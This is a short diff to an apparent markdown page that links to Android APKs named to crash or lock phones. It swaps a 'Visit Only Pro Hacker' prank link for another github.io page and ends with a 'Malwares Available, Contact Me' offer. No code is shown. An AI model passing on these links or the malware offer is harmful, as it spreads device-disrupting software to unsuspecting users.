@@ -11,7 +11,7 @@
 -   <a href="https://github.com/Elliot290/Test/raw/main/Crash.apk">Crash Android Apk 📴</a>
 -   <a href="https://github.com/Elliot290/Test/raw/main/Miss%20You%E2%9D%A4.apk">Stuck Android2</a>
 ### Don't Visit
--   <a href="https://theannoyingsite.com">Visit Only Pro Hacker⚠️</a>
+-   <a href="https://baapg.github.io/BaapG.html">Visit Only Pro Hacker⚠️</a>
 
 ### Malwares Available
     Contact Me
